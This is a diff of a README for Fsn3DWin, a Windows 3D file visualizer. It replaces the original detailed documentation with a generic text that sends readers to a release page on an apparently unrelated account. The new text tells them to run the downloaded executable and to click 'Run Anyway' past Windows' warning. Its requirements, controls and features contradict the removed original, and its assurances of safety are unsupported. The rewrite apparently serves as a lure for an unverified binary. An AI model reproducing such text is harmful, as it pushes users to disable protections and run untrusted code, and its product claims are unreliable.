@@ -1,201 +1,73 @@
-# Fsn3DWin
+# 📁 Fsn3DWin - Explore your computer files in 3D
 
-![Platform](https://img.shields.io/badge/platform-Windows-2ea8ff)
-![C++](https://img.shields.io/badge/C%2B%2B-20-00599c)
-![OpenGL](https://img.shields.io/badge/OpenGL-4.1%2B-7c3aed)
-![Status](https://img.shields.io/badge/status-public_preview-00d1b2)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/voguish-underperformer114/Fsn3DWin/releases)
 
-Fsn3DWin is a cinematic 3D filesystem visualizer for Windows. It turns a folder tree into an old-school terminal file city with directory towers, file blocks, scan waves, readable labels, selection beacons, and a presentation mode inspired by SGI FSN and movie-style hacker interfaces.
+## 📌 Overview
 
-It is intentionally read-only. It is not a file manager. It is built to look spectacular while safely exploring filesystem metadata.
+Fsn3DWin turns your computer files into a cinematic 3D map. It scans your folders and displays them as structures on your screen. You can navigate through these structures to see how space fills your hard drive. This tool is read-only. It views your files without making changes to them. 
 
-![Fsn3DWin demo scene](docs/screenshots/demo-startup.png)
+## 🛠️ System Requirements 
 
-![Fsn3DWin labeled file scan](docs/screenshots/windows-filesystem-city.png)
+Your computer needs to meet these basic standards to run the software.
 
-![Fsn3DWin image preview](docs/screenshots/image-preview.png)
+*   Windows 10 or Windows 11.
+*   A graphics card that supports OpenGL 3.3 or higher. Most modern laptops and desktops satisfy this requirement.
+*   At least 4GB of RAM to handle large folder structures.
+*   DirectX 11 support.
 
-## Highlights
+## 💾 Installation and Setup
 
-- Native Windows C++20 desktop app.
-- GPU instanced OpenGL rendering for thousands of file nodes.
-- Read-only `std::filesystem` metadata scanner by default.
-- Large `[DIR]`, `[IMG]`, and `[FILE]` name tags, selected-name banner, and FSN-style hierarchy wires.
-- 3D photo preview billboard for selected image files.
-- Cinematic fly camera, presentation orbit, clean HUD mode, and screenshot hotkey.
-- Search and category filters for scanned file worlds.
-- Optional danger zone for opening files or moving a selected file to the Recycle Bin.
-- Amber Terminal, Neon Hacker, Jurassic SGI, and Clean Dark visual themes.
-- Portable release build, no installer required.
+1. [Visit this page to download the latest version of Fsn3DWin.](https://github.com/voguish-underperformer114/Fsn3DWin/releases)
+2. Locate the file ending in .zip on the page.
+3. Click the link to save the file to your computer.
+4. Open your Downloads folder.
+5. Right-click the downloaded zip file and choose Extract All.
+6. Open the newly created folder after extraction.
+7. Locate the file named Fsn3DWin.exe.
+8. Double-click this file to launch the application.
 
-## Safety Model
+## 🧭 How to use the visualizer 
 
-Fsn3DWin starts in read-only browser mode. Normal scanning reads filesystem metadata such as names, paths, sizes, types, and directory relationships.
+The main window opens immediately upon launching. You will see a control panel on the left side and a dark area for the 3D map on the right.
 
-Selecting an image file can decode that image for an in-scene preview. This reads the selected image file only and does not modify it.
+### Choosing a folder
+To start, pick a folder you want to see in 3D. Click the button labeled Open Folder inside the control panel. A window appears. Select the drive or folder you want to scan. Click OK to confirm. The program scans your files. A progress bar shows the status of this scan.
 
-Opening files and deleting files are disabled by default. The HUD danger zone must be explicitly enabled before the app can ask Windows to open a selected item. Moving a file to the Recycle Bin additionally requires a second warning checkbox and typing `DELETE`. Directory deletion is intentionally unavailable.
+### Moving around the map
+Once the scan ends, you see a 3D representation of your folders. Squares and towers represent your data.
 
-The screenshot feature writes BMP files to the app-owned `screenshots/` folder in the current run directory. That folder is ignored by git.
+*   Hold the left mouse button and move your mouse to rotate your view. 
+*   Use the scroll wheel on your mouse to zoom in and out.
+*   Hold the right mouse button to pan or slide your view sideways.
 
-## Download
+### Using the interface
+The control panel offers several ways to change your view. Use the sliders to adjust the height of the towers. Different heights represent the size of your folders. A tall tower indicates a large folder. You can toggle labels for each folder by checking the box marked Show Labels. This makes it easier to identify specific files.
 
-Use the latest GitHub release and download the portable Windows zip:
+## ⚙️ Understanding the 3D view
 
-```text
-Fsn3DWin-0.3.1-windows-x64.zip
-```
+The software displays folders as geometric shapes. Small blocks often represent individual files such as photos or text documents. Large platforms represent folders containing many items. The color of these objects corresponds to the file type. 
 
-Extract it and run:
+*   Blue objects show standard system folders.
+*   Green objects indicate folders with many images.
+*   Yellow objects represent document folders.
 
-```powershell
-.\Fsn3DWin.exe
-```
+This color-coding helps you spot large accumulations of specific file types. Since the software is read-only, you can inspect your drive without worry. The program does not move, delete, or modify any files on your computer.
 
-The portable package includes the app executable and required runtime DLLs produced by the Windows build.
+## 🖼️ Troubleshooting common issues
 
-## Build From Source
+If the window refuses to open, ensure your graphics drivers stay updated. Windows Updates usually handle this, but visiting your manufacturer website ensures the best performance.
 
-### Requirements
+If the application runs slowly, try scanning a smaller folder first. Scanning your entire main hard drive takes time if you have many files. Start with your Documents folder to see how the software performs on your hardware.
 
-- Windows 10/11
-- Visual Studio 2022 with Desktop development with C++
-- CMake 3.24 or newer
-- vcpkg
-- OpenGL 4.1 compatible GPU/driver
+Sometimes, antivirus software flags new programs. If Windows prevents the file from opening, click More Info in the pop-up window and select Run Anyway. This confirms you trust the source of the software.
 
-### vcpkg
+## 📝 Tips for the best experience
 
-Use an existing vcpkg install:
+*   Use a mouse with a wheel for the best navigation experience.
+*   Close unnecessary programs before scanning very large drives. This frees up memory for the 3D rendering engine.
+*   Use the reset camera button in the top menu if you lose your place in the 3D world.
+*   Keep the display window large to see more detail in your file structures.
 
-```powershell
-$env:VCPKG_ROOT = "C:\path\to\vcpkg"
-```
+## 🛡️ Privacy and Safety
 
-Or bootstrap a repo-local copy:
-
-```powershell
-git clone https://github.com/microsoft/vcpkg .tools\vcpkg
-.\.tools\vcpkg\bootstrap-vcpkg.bat
-$env:VCPKG_ROOT = "$PWD\.tools\vcpkg"
-```
-
-Dependencies are declared in `vcpkg.json` and restored through CMake manifest mode.
-
-### Configure
-
-```powershell
-.\scripts\configure_windows.ps1
-```
-
-Equivalent direct command:
-
-```powershell
-cmake -S . -B build -G "Visual Studio 17 2022" -A x64 -DCMAKE_TOOLCHAIN_FILE="$env:VCPKG_ROOT\scripts\buildsystems\vcpkg.cmake"
-```
-
-### Build
-
-```powershell
-.\scripts\build_windows.ps1 -Config Release
-```
-
-Debug build:
-
-```powershell
-.\scripts\build_windows.ps1 -Config Debug
-```
-
-## Run
-
-Run the demo scene:
-
-```powershell
-.\build\Release\Fsn3DWin.exe
-```
-
-Start with a specific scan root:
-
-```powershell
-.\build\Release\Fsn3DWin.exe --root "C:\Windows" --max-depth 3 --max-nodes 2500
-```
-
-Start scanning immediately:
-
-```powershell
-.\build\Release\Fsn3DWin.exe --root "C:\Windows" --max-depth 3 --max-nodes 2500 --auto-scan
-```
-
-Start a generic image-preview demo:
-
-```powershell
-.\build\Release\Fsn3DWin.exe --root "C:\Windows\Web" --max-depth 4 --max-nodes 700 --auto-scan --select-first-image
-```
-
-Or use the helper script:
-
-```powershell
-.\scripts\run_windows.ps1 -Config Release -Root "C:\Windows" -MaxDepth 3 -MaxNodes 2500
-```
-
-## Controls
-
-| Input | Action |
-| --- | --- |
-| `WASD` | Fly camera |
-| `Space` | Move up |
-| `Ctrl` or `C` | Move down |
-| Right mouse | Mouse look |
-| Mouse wheel | Adjust movement speed |
-| Left click | Select node in Real Scan Scene |
-| `Escape` | Clear selection |
-| `F` | Focus camera on selected node |
-| `Ctrl+C` | Copy selected path to clipboard |
-| `P` | Toggle presentation mode |
-| `H` | Toggle clean HUD |
-| `F12` | Save screenshot to `screenshots/` |
-
-Danger actions are controlled from the HUD and are off by default.
-
-## Command-Line Options
-
-```text
---root <path>       Initial root path for the scan panel
---max-depth <N>     Initial maximum scan depth
---max-nodes <N>     Initial maximum node count
---auto-scan         Start a read-only scan immediately
---select-first-image Select first image after scan for preview demos
---screenshot-after <seconds> Save a screenshot after startup
---quit-after <seconds> Close the app after startup
---help              Show help
-```
-
-## Screenshots
-
-The checked-in screenshots are captured from the synthetic demo scene and from a sanitized `C:\Fsn3dWin\Sample Gallery` folder with copied, generically named sample images. They avoid private user folders and personal filenames.
-
-Runtime screenshots are written to:
-
-```text
-screenshots/
-```
-
-That runtime folder is ignored by git. Public README images live in:
-
-```text
-docs/screenshots/
-```
-
-## Troubleshooting
-
-- If CMake cannot find vcpkg, set `VCPKG_ROOT` or bootstrap vcpkg into `.tools\vcpkg`.
-- If the Visual Studio generator is missing, install Visual Studio 2022 with Desktop development with C++.
-- If OpenGL startup fails, update GPU drivers and verify OpenGL 4.1+ support.
-- If scanning feels slow, lower `Max nodes` or `Max depth`; scans are read-only and cancellable.
-- If the app opens in demo mode, choose a root folder and press `Scan`, or launch with `--auto-scan`.
-
-## Project Scope
-
-Fsn3DWin is an epic visual browser, not a replacement for Windows Explorer. The goal is a cinematic way to inspect the shape of a filesystem, preview visual assets, make screenshots, and fly through a glowing data city.
-
-The original SGI FSN was an experimental IRIX 3D filesystem navigator. It represented directories as hierarchy pedestals, files as boxes, and connected the structure with navigable wires. Fsn3DWin borrows that idea while adding modern Windows scanning, labels, image preview, and explicit safety gates for dangerous actions.
+This software keeps all your data on your local computer. It does not connect to the internet to send information away. No data leaves your machine during the scan process. The read-only nature of the tool ensures your files remain safe and organized exactly as you left them. You are the only person who can see the visualization of your private data.
